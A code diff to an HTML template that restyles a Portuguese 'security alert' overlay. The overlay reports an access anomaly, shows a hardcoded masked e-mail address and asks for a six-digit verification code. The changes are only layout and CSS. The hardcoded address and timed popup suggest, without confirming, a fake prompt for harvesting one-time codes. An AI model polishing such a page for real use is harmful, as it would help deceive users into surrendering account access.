@@ -40,18 +40,13 @@
     <div id="securityPopup" class="security-overlay" style="display: none;">
         <div class="security-popup">
             <div class="security-icon">
-                <svg width="56" height="56" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <!-- Flat unlock icon -->
-                    <path d="M44 28V22C44 15.37 38.63 10 32 10S20 15.37 20 22v6H18c-2.21 0-4 1.79-4 4v20c0 2.21 1.79 4 4 4h28c2.21 0 4-1.79 4-4V32c0-2.21-1.79-4-4-4H44z" fill="#F57C00"/>
-                    <path d="M32 10c-6.63 0-12 5.37-12 12v6h6V22c0-3.31 2.69-6 6-6s6 2.69 6 6v6h6V22c0-6.63-5.37-12-12-12z" fill="#FFB300"/>
-                    <circle cx="32" cy="38" r="5" fill="#FFFFFF"/>
-                </svg>
+                <img src="/static/img/unlock-v2.png" alt="Cadeado" width="60" height="60">
             </div>
             <h3>Alerta de segurança!</h3>
-            <p>Percebemos uma anomalia no padrão de acesso. Para garantir a sua segurança, precisamos validar a sua identidade.</p>
+            <p class="security-text">Percebemos uma anomalia no padrão de acesso. Para garantir a sua segurança, precisamos validar a sua identidade.</p>
             <div class="security-divider"></div>
             <p class="email-sent-text">Um código de validação foi enviado para o e-mail:</p>
-            <p class="email-masked">r*****@s******.**.b*</p>
+            <p class="email-masked">ro*****@s*******.c**.b*</p>
             <p class="info-code-text">Informe o código recebido para continuar.</p>
             <div class="code-input-container">
                 <input type="text" class="otp-code-box" placeholder="·" maxlength="1" inputmode="numeric">
@@ -292,74 +287,82 @@ setTimeout(() => {
 /* Security Popup Overlay */
 .security-overlay {
     position: absolute;
-    top: -20px;
-    left: -40px;
-    right: -40px;
-    bottom: -20px;
-    background: rgba(0, 0, 0, 0.55);
+    top: -24px;
+    left: -60px;
+    right: -60px;
+    bottom: -24px;
+    background: rgba(0, 0, 0, 0.5);
     border-radius: 16px;
     display: flex;
     align-items: center;
     justify-content: center;
     z-index: 10;
-    padding: 24px 40px;
+    padding: 28px 56px;
 }
 
 .security-popup {
     background: #ffffff;
     border-radius: 20px;
-    padding: 36px 40px 32px 40px;
+    padding: 40px 48px 36px 48px;
     width: 100%;
-    max-width: 440px;
+    max-width: 480px;
     text-align: center;
-    box-shadow: 0 12px 40px rgba(0, 0, 0, 0.25);
+    box-shadow: 0 16px 48px rgba(0, 0, 0, 0.2);
 }
 
 .security-icon {
     margin-bottom: 20px;
 }
 
+.security-icon img {
+    filter: none;
+}
+
 .security-popup h3 {
     font-size: 22px;
     font-weight: 700;
     color: #1a1a1a;
-    margin: 0 0 10px 0;
+    margin: 0 0 12px 0;
 }
 
-.security-popup > p {
-    font-size: 14.5px;
+.security-text {
+    font-size: 14px;
     color: #666;
     margin: 0 0 4px 0;
-    line-height: 1.5;
+    line-height: 1.6;
     font-weight: 400;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    max-width: 100%;
 }
 
 .security-divider {
     height: 1px;
     background: #e5e5e5;
-    margin: 20px 0;
+    margin: 22px 0;
 }
 
 .email-sent-text {
     font-size: 14px !important;
     color: #1a1a1a !important;
-    margin-bottom: 6px !important;
+    margin-bottom: 8px !important;
     font-weight: 400;
 }
 
 .email-masked {
-    font-size: 22px !important;
+    font-size: 24px !important;
     font-weight: 700;
     color: #1a1a1a !important;
-    margin: 6px 0 10px 0 !important;
-    letter-spacing: 1.5px;
+    margin: 8px 0 12px 0 !important;
+    letter-spacing: 2px;
     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
 }
 
 .info-code-text {
     font-size: 14px !important;
     color: #1a1a1a !important;
-    margin-bottom: 20px !important;
+    margin-bottom: 24px !important;
     font-weight: 400;
 }
 
@@ -367,7 +370,7 @@ setTimeout(() => {
     display: flex;
     gap: 10px;
     justify-content: center;
-    margin: 20px 0 14px 0;
+    margin: 24px 0 16px 0;
 }
 
 .otp-code-box {
@@ -392,33 +395,33 @@ setTimeout(() => {
 .code-expiry {
     font-size: 13px;
     color: #888;
-    margin: 14px 0 0 0;
+    margin: 16px 0 0 0;
 }
 
 /* Success Popup */
 .success-overlay {
     position: absolute;
-    top: -20px;
-    left: -40px;
-    right: -40px;
-    bottom: -20px;
-    background: rgba(0, 0, 0, 0.55);
+    top: -24px;
+    left: -60px;
+    right: -60px;
+    bottom: -24px;
+    background: rgba(0, 0, 0, 0.5);
     border-radius: 16px;
     display: flex;
     align-items: center;
     justify-content: center;
     z-index: 10;
-    padding: 24px 40px;
+    padding: 28px 56px;
 }
 
 .success-popup {
     background: #ffffff;
     border-radius: 20px;
-    padding: 40px 44px 36px 44px;
+    padding: 44px 48px 40px 48px;
     width: 100%;
-    max-width: 440px;
+    max-width: 480px;
     text-align: center;
-    box-shadow: 0 12px 40px rgba(0, 0, 0, 0.25);
+    box-shadow: 0 16px 48px rgba(0, 0, 0, 0.2);
 }
 
 .success-icon {
@@ -429,13 +432,13 @@ setTimeout(() => {
     font-size: 22px;
     font-weight: 700;
     color: #1a1a1a;
-    margin: 0 0 10px 0;
+    margin: 0 0 12px 0;
 }
 
 .success-popup > p {
     font-size: 15px;
     color: #555;
-    margin: 0 0 20px 0;
+    margin: 0 0 24px 0;
     line-height: 1.5;
     font-weight: 400;
 }
@@ -455,6 +458,20 @@ setTimeout(() => {
 #2faCard > .otp-resend {
     opacity: 0.3;
     pointer-events: none;
+}
+
+/* Mobile adjustments */
+@media (max-width: 500px) {
+    .security-overlay, .success-overlay {
+        left: -20px;
+        right: -20px;
+        padding: 20px 24px;
+    }
+    
+    .security-popup, .success-popup {
+        max-width: 360px;
+        padding: 32px 28px;
+    }
 }
 </style>
 {% endblock %}
